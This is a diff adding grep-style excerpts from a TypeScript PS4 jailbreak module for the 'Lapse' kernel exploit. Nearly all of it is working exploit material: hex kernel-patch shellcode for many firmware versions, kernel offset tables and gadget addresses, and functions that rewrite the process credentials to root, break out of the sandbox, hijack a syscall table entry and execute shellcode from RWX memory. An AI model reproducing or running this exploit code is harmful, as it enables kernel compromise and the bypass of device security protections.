@@ -1,0 +1,369 @@
+=== hashes ===
+abd545ebb7024301823240d512d6b30abf68e1bb088710fa770e1361c1146bd4  research/webkit-1302/upstream/riyon-kernel.ts
+=== support/offset excerpts ===
+1-import { BigInt, mem, fn, utils, syscalls } from 'download0/types'
+2-
+3:/** *** kernel_offset.js *****/
+4-
+5-// PS4 Kernel Offsets for Lapse exploit
+6-// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py
+7-
+8-// Kernel patch shellcode (hex strings) - patches security checks in kernel
+9-// These are executed via kexec after jailbreak to enable full functionality
+10-const kpatch_shellcode = {
+11-  '5.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb04000041b890e9ffff4881c2a0320100c681bd0a0000ebc6816da31e00ebc681b1a31e00ebc6812da41e00ebc68171a41e00ebc6810da61e00ebc6813daa1e00ebc681fdaa1e00ebc7819304000000000000c681c5040000eb668981bc0400006689b1b8040000c6817d4a0500eb6689b9f83a1a00664489812a7e2300c78150232b004831c0c3c68110d5130037c68113d5130037c78120c807010200000048899128c80701c7814cc80701010000000f20c0480d000001000f22c031c0c3',
+--
+28-  '10.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898113302100b8eb04000041b9eb00000041baeb000000668981ecb2470041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800eb668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be05000000668981f1c93400b8eb060000bf0500000066898133ca340041ba0100000048b84183bfa00400000041bb010000004889813bca3400b8040000006689814dca3400b8498bffffc78149ca3400498b87d0c6814fca340000c78156ca3400498bb7b06689915aca3400c6815cca340000c7816eca3400498b87406689b172ca3400c68174ca340000c7817bca3400498bb7206689b97fca3400c68181ca340000c78193ca3400498dbfc06644898197ca3400c68199ca340000c7819fca3400498dbfe066448989a3ca3400c681a5ca340000c781b2ca3400498dbf0066448991b6ca3400c681b8ca340000c781beca3400498dbf2066448999c2ca3400c681c4ca340000668981cfca3400c681d1ca3400ff0f20c0480d000001000f22c031c0c3',
+29-  '11.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e00b8eb04000041b9eb00000041baeb000000668981ecc8350041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300eb668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be05000000668981b1db3000b8eb060000bf05000000668981f3db300041ba0100000048b84183bfa00400000041bb01000000488981fbdb3000b8040000006689810ddc3000b8498bffffc78109dc3000498b87d0c6810fdc300000c78116dc3000498bb7b06689911adc3000c6811cdc300000c7812edc3000498b87406689b132dc3000c68134dc300000c7813bdc3000498bb7206689b93fdc3000c68141dc300000c78153dc3000498dbfc06644898157dc3000c68159dc300000c7815fdc3000498dbfe06644898963dc3000c68165dc300000c78172dc3000498dbf006644899176dc3000c68178dc300000c7817edc3000498dbf206644899982dc3000c68184dc3000006689818fdc3000c68191dc3000ff0f20c0480d000001000f22c031c0c3',
+30-  '11.02': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e00b8eb04000041b9eb00000041baeb0000006689810cc9350041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300eb66898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be05000000668981d1db3000b8eb060000bf0500000066898113dc300041ba0100000048b84183bfa00400000041bb010000004889811bdc3000b8040000006689812ddc3000b8498bffffc78129dc3000498b87d0c6812fdc300000c78136dc3000498bb7b06689913adc3000c6813cdc300000c7814edc3000498b87406689b152dc3000c68154dc300000c7815bdc3000498bb7206689b95fdc3000c68161dc300000c78173dc3000498dbfc06644898177dc3000c68179dc300000c7817fdc3000498dbfe06644898983dc3000c68185dc300000c78192dc3000498dbf006644899196dc3000c68198dc300000c7819edc3000498dbf2066448999a2dc3000c681a4dc300000668981afdc3000c681b1dc3000ff0f20c0480d000001000f22c031c0c3',
+31-  '11.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be0500000066898151551200b8eb060000bf050000006689819355120041ba0100000048b84183bfa00400000041bb010000004889819b551200b804000000668981ad551200b8498bffffc781a9551200498b87d0c681af55120000c781b6551200498bb7b0668991ba551200c681bc55120000c781ce551200498b87406689b1d2551200c681d455120000c781db551200498bb7206689b9df551200c681e155120000c781f3551200498dbfc066448981f7551200c681f955120000c781ff551200498dbfe06644898903561200c6810556120000c78112561200498dbf006644899116561200c6811856120000c7811e561200498dbf206644899922561200c68124561200006689812f561200c68131561200ff0f20c0480d000001000f22c031c0c3',
+32-  '12.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba040000004531c04531c9be0500000066898151551200b8eb060000bf050000006689819355120041ba0100000048b84183bfa00400000041bb010000004889819b551200b804000000668981ad551200b8498bffffc781a9551200498b87d0c681af55120000c781b6551200498bb7b0668991ba551200c681bc55120000c781ce551200498b87406689b1d2551200c681d455120000c781db551200498bb7206689b9df551200c681e155120000c781f3551200498dbfc066448981f7551200c681f955120000c781ff551200498dbfe06644898903561200c6810556120000c78112561200498dbf006644899116561200c6811856120000c7811e561200498dbf206644899922561200c68124561200006689812f561200c68131561200ff0f20c0480d000001000f22c031c0c3',
+33:  '12.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689812cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900eb668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
+34:  '13.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689814cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900eb668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
+35-}
+36-
+37:// Mmap RWX patch offsets per firmware (for verification)
+38-// These are the offsets where 0x33 is patched to 0x37
+39:const kpatch_mmap_offsets: Record<string, [number, number]> = {
+40-  // TODO: missing 5.00 to 8.50
+41-  '5.55': [0x3c2899, 0x3c289c],   // TODO: verify
+42-  '5.56': [0x24026d, 0x240270],   // TODO: verify
+43-  '6.00': [0x24026d, 0x240270],   // TODO: verify
+44-  '6.20': [0x24026d, 0x240270],   // TODO: verify
+45-  '6.50': [0xab57a, 0xab57d],     // TODO: verify
+46-  '6.70': [0xab57a, 0xab57d],     // TODO: verify
+47-  '7.00': [0x1d2336, 0x1d2339],   // TODO: verify
+--
+55-  '10.50': [0x19c42a, 0x19c42d],  // TODO: verify
+56-  '11.00': [0x15626a, 0x15626d],
+57-  '11.02': [0x15628a, 0x15628d],
+58-  '11.50': [0x1fa63a, 0x1fa63d],
+59-  '12.00': [0x1fa71a, 0x1fa71d],
+60:  '12.50': [0x1fa75a, 0x1fa75d],
+61:  '13.00': [0x1fa77a, 0x1fa77d],
+62:  '13.02': [0x1fa78a, 0x1fa78d],
+63-}
+64-
+65-const shellcode_fw_map = {
+66-  '5.00': '5.00',
+67-  '5.01': '5.00',
+68-  '5.03': '5.03',
+69-  '5.05': '5.03',
+70-  '5.07': '5.03',
+--
+106-  '11.02': '11.02',
+107-  '11.50': '11.50',
+108-  '11.52': '11.50',
+109-  '12.00': '12.00',
+110-  '12.02': '12.00',
+111:  '12.50': '12.50',
+112:  '12.52': '12.50',
+113:  '13.00': '13.00',
+114-}
+115-
+116:export function get_mmap_patch_offsets (fw_version: string): [number, number] | null {
+117-  // Normalize version
+118-  let lookup = fw_version
+119-  if (fw_version === '9.04') lookup = '9.03'
+120-  else if (fw_version === '9.51' || fw_version === '9.60') lookup = '9.50'
+121-  else if (fw_version === '10.01') lookup = '10.00'
+122-  else if (fw_version === '10.70' || fw_version === '10.71') lookup = '10.50'
+123-  else if (fw_version === '11.52') lookup = '11.50'
+124-  else if (fw_version === '12.02') lookup = '12.00'
+125:  else if (fw_version === '12.52') lookup = '12.50'
+126:  else if (fw_version === '13.04') lookup = '13.02'
+127-
+128:  return kpatch_mmap_offsets[lookup as keyof typeof kpatch_mmap_offsets] || null
+129-}
+130-
+131-// Helper to convert hex string to byte array
+132-function hexToBytes (hex: string) {
+133-  const bytes = []
+134-  for (let i = 0; i < hex.length; i += 2) {
+135-    bytes.push(parseInt(hex.slice(i, i + 2), 16))
+136-  }
+--
+373-  SYSENT_661: 0x110A760,
+374-  JMP_RSI_GADGET: 0x47B31,
+375-  KL_LOCK: 0xE6C20,
+376-}
+377-
+378:const offset_ps4_12_50 = {        // AND 12.52, 13.00
+379:  EVF_OFFSET: 0x0,        // Missing but not needed in netctrl
+380-  PRISON0: 0x111FA18,
+381-  ROOTVNODE: 0x2136E90,
+382:  TARGET_ID_OFFSET: 0x0,  // Missing but not needed in netctrl
+383-  SYSENT_661: 0x110A760,
+384-  JMP_RSI_GADGET: 0x47B31,
+385-  KL_LOCK: 0xE6C20,
+386-}
+387-
+388-// Map firmware versions to offset objects
+389:export const ps4_kernel_offset_list = {
+390-  '5.00': offset_ps4_5_00,
+391-  '5.01': offset_ps4_5_00,
+392-  '5.03': offset_ps4_5_03,
+393-  '5.05': offset_ps4_5_05,
+394-  '5.07': offset_ps4_5_05,
+395-  '5.50': offset_ps4_5_50,
+396-  '5.53': offset_ps4_5_53,
+397-  '5.55': offset_ps4_5_55,
+--
+431-  '11.02': offset_ps4_11_02,
+432-  '11.50': offset_ps4_11_50,
+433-  '11.52': offset_ps4_11_50,
+434-  '12.00': offset_ps4_12_00,
+435-  '12.02': offset_ps4_12_00,
+436:  '12.50': offset_ps4_12_50,
+437:  '12.52': offset_ps4_12_50,
+438:  '13.00': offset_ps4_12_50,
+439-}
+440-
+441:let kernel_offset: (typeof ps4_kernel_offset_list[keyof typeof ps4_kernel_offset_list]) & {
+442-  PROC_FD?: number,
+443-  PROC_PID?: number,
+444-  PROC_VM_SPACE?: number,
+445-  PROC_UCRED?: number,
+446-  PROC_COMM?: number,
+447-  PROC_SYSENT?: number,
+448-  FILEDESC_OFILES?: number,
+449-  SIZEOF_OFILES?: number,
+--
+453-  INPCB_PKTOPTS?: number,
+454-  IP6PO_TCLASS?: number,
+455-  IP6PO_RTHDR?: number,
+456-} | null = null // Global
+457-
+458:export function get_kernel_offset (FW_VERSION: string) {
+459:  const fw_offsets = ps4_kernel_offset_list[FW_VERSION as keyof typeof ps4_kernel_offset_list]
+460-
+461-  if (!fw_offsets) {
+462-    throw new Error('Unsupported PS4 firmware version: ' + FW_VERSION)
+463-  }
+464-
+465:  kernel_offset = fw_offsets
+466-
+467-  // PS4-specific proc structure offsets
+468:  kernel_offset.PROC_FD = 0x48
+469:  kernel_offset.PROC_PID = 0xB0       // PS4 = 0xB0, PS5 = 0xBC
+470:  kernel_offset.PROC_VM_SPACE = 0x200
+471:  kernel_offset.PROC_UCRED = 0x40
+472:  kernel_offset.PROC_COMM = -1        // Found dynamically
+473:  kernel_offset.PROC_SYSENT = -1      // Found dynamically
+474-
+475-  // filedesc - PS4 different from PS5
+476:  kernel_offset.FILEDESC_OFILES = 0x0  // PS4 = 0x0, PS5 = 0x8
+477:  kernel_offset.SIZEOF_OFILES = 0x8    // PS4 = 0x8, PS5 = 0x30
+478-
+479-  // vmspace structure
+480:  kernel_offset.VMSPACE_VM_PMAP = -1
+481-
+482-  // pmap structure
+483:  kernel_offset.PMAP_CR3 = 0x28
+484-
+485-  // socket/net - PS4 specific
+486:  kernel_offset.SO_PCB = 0x18
+487:  kernel_offset.INPCB_PKTOPTS = 0x118  // PS4 = 0x118, PS5 = 0x120
+488-
+489-  // pktopts structure - PS4 specific
+490:  kernel_offset.IP6PO_TCLASS = 0xB0    // PS4 = 0xB0, PS5 = 0xC0
+491:  kernel_offset.IP6PO_RTHDR = 0x68     // PS4 = 0x68, PS5 = 0x70
+492-
+493:  return kernel_offset
+494-}
+495-
+496-// Global kernel object to save information
+497-// Also used in lapse.js
+498-
+499-export const kernel: {
+500-  addr: {
+501-    base?: BigInt,
+--
+727-//      kernel.addr.allproc
+728-//      kernel.addr.base
+729-
+730-fn.register(0x18, 'getuid', [], 'bigint')
+731-fn.register(0x249, 'is_in_sandbox', [], 'bigint')
+732:fn.register(477, 'mmap', ['bigint', 'number', 'number', 'number', 'bigint', 'number'], 'bigint')
+733-fn.register(0x49, 'munmap', ['bigint', 'number'], 'bigint')
+734-const getuid = fn.getuid
+735-const is_in_sandbox = fn.is_in_sandbox
+736:const mmap = fn.mmap
+737-const munmap = fn.munmap
+738-
+739-export function jailbreak_shared (FW_VERSION: string) {
+740-  if (!kernel.addr.curproc || !kernel.addr.base || !kernel.addr.allproc) {
+741-    throw new Error('kernel.addr is not properly initialized')
+742-  }
+743:  if (!kernel_offset) {
+744:    throw new Error('kernel_offset is not initialized')
+745-  }
+746-
+747-  const OFFSET_P_UCRED = 0x40
+748-  const proc = kernel.addr.curproc
+749-
+750-  const uid_before = Number(getuid())
+751-  const sandbox_before = Number(is_in_sandbox())
+752-  debug('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)
+753-
+754-  // Patch ucred
+755:  const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))
+756-  const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))
+757-
+758-  if (!proc_fd || !ucred) {
+759-    throw new Error('Failed to read proc_fd or ucred')
+760-  }
+761-
+762-  kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
+763-  kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
+764-  kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
+765-  kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
+766-  kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid
+767-
+768:  const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))
+769-  if (!prison0) {
+770-    throw new Error('Failed to read prison0')
+771-  }
+772-  kernel.write_qword(ucred.add(0x30), prison0)
+773-
+774-  kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
+775-  kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
+776-
+777:  const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))
+778-  if (!rootvnode) {
+779-    throw new Error('Failed to read rootvnode')
+780-  }
+781-  kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
+782-  kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir
+783-
+784-  const uid_after = Number(getuid())
+785-  const sandbox_after = Number(is_in_sandbox())
+--
+800-
+801-    // Comprehensive kernel patch verification
+802-    debug('Verifying kernel patches...')
+803-    let all_patches_ok = true
+804-
+805:    // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
+806:    const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
+807:    if (mmap_offsets) {
+808:      const b1 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[0]!))
+809:      const b2 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[1]!))
+810-      if (b1 === 0x37 && b2 === 0x37) {
+811:        debug('  [OK] mmap RWX patch')
+812-      } else {
+813:        debug('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]!) + ']=' + hex(b1 ?? 0) + ' [' + hex(mmap_offsets[1]!) + ']=' + hex(b2 ?? 0))
+814-        all_patches_ok = false
+815-      }
+816-    } else {
+817:      debug('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
+818-    }
+819-
+820:    // 2. Test mmap RWX actually works by trying to allocate RWX memory
+821-    try {
+822-      const PROT_RWX = 0x7  // READ | WRITE | EXEC
+823-      const MAP_ANON = 0x1000
+824-      const MAP_PRIVATE = 0x2
+825:      const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
+826-      if (Number(test_addr.shr(32)) < 0xffff8000) {
+827:        debug('  [OK] mmap RWX functional @ ' + hex(test_addr))
+828-        // Unmap the test allocation
+829-        munmap(test_addr, 0x1000)
+830-      } else {
+831:        debug('  [FAIL] mmap RWX functional: ' + hex(test_addr))
+832-        all_patches_ok = false
+833-      }
+834-    } catch (e) {
+835:      debug('  [FAIL] mmap RWX test error: ' + (e as Error).message)
+836-      all_patches_ok = false
+837-    }
+838-
+839-    if (all_patches_ok) {
+840-      debug('All kernel patches verified OK!')
+841-    } else {
+842-      debug('[WARNING] Some kernel patches may have failed')
+843-    }
+--
+856-export function apply_kernel_patches (fw_version: string) {
+857-  try {
+858-    if (!kernel.addr.base) {
+859-      throw new Error('kernel.addr.base is not initialized')
+860-    }
+861:    if (!kernel_offset) {
+862:      throw new Error('kernel_offset is not initialized')
+863-    }
+864-    // Get shellcode for this firmware
+865-    const shellcode = get_kpatch_shellcode(fw_version)
+866-    if (!shellcode) {
+867-      debug('No kernel patch shellcode for FW ' + fw_version)
+868-      return false
+869-    }
+870-
+--
+878-
+879-    const mapping_addr = new BigInt(0x9, 0x26100000)  // Different from 0x920100000 to avoid conflicts
+880-    const aligned_memsz = 0x10000
+881-
+882-    // Get sysent[661] address and save original values
+883:    const sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661)
+884-    debug('sysent[661] @ ' + hex(sysent_661_addr))
+885-
+886-    const sy_narg = kernel.read_dword(sysent_661_addr)
+887-    const sy_call = kernel.read_qword(sysent_661_addr.add(8))
+888-    const sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C))
+889-
+890-    debug('Original sy_narg: ' + hex(sy_narg ?? 0))
+891-    debug('Original sy_call: ' + hex(sy_call ?? 0))
+--
+895-      debug('ERROR: Failed to read original sysent[661] values')
+896-      return false
+897-    }
+898-
+899-    // Calculate jmp rsi gadget address
+900:    const jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET)
+901-    debug('jmp rsi gadget @ ' + hex(jmp_rsi_gadget))
+902-
+903-    // Allocate buffer for shellcode in userspace first
+904-    const shellcode_buf = malloc(shellcode.length + 0x100)
+905-    debug('Shellcode buffer @ ' + hex(shellcode_buf))
+906-
+907-    // Copy shellcode to userspace buffer
+908-    for (let i = 0; i < shellcode.length; i++) {
+--
+944-      kernel.write_qword(sysent_661_addr.add(8), sy_call)
+945-      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
+946-      return false
+947-    }
+948-
+949:    // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
+950:    debug('Calling mmap...')
+951-
+952:    const mmap_result = mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
+953:    debug('mmap result: ' + hex(mmap_result))
+954-
+955:    if (Number(mmap_result.shr(32)) >= 0xffff8000) {
+956:      debug('ERROR: mmap failed')
+957-      kernel.write_dword(sysent_661_addr, sy_narg)
+958-      kernel.write_qword(sysent_661_addr.add(8), sy_call)
+959-      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
+960-      return false
+961-    }
+962-
+963-    // 3. Copy shellcode to mapped memory
+964-    debug('Copying shellcode to ' + hex(mapping_addr) + '...')
+--
+1001-        { off: 0x4b9, exp: 0x00eb, name: 'syscall_jmp2', size: 2 },
+1002-        { off: 0x4b5, exp: 0x00eb, name: 'syscall_jmp3', size: 2 },
+1003-        { off: 0x3914e6, exp: 0xeb, name: 'setuid', size: 1 },
+1004-        { off: 0x2fc0ec, exp: 0x04eb, name: 'vm_map_protect', size: 2 },
+1005-        { off: 0x1b7164, exp: 0xe990, name: 'dynlib_load_prx', size: 2 },
+1006:        { off: 0x1fa71a, exp: 0x37, name: 'mmap_rwx1', size: 1 },
+1007:        { off: 0x1fa71d, exp: 0x37, name: 'mmap_rwx2', size: 1 },
+1008-        { off: 0x1102d80, exp: 0x02, name: 'sysent11_narg', size: 4 },
+1009-        { off: 0x1102dac, exp: 0x01, name: 'sysent11_thrcnt', size: 4 },
+1010-      ]
+1011-
+1012-      for (const p of patches_to_verify) {
+1013-        let actual
+1014-        if (p.size === 1) {
+1015-          actual = Number(kernel.read_byte(kernel.addr.base.add(p.off)))
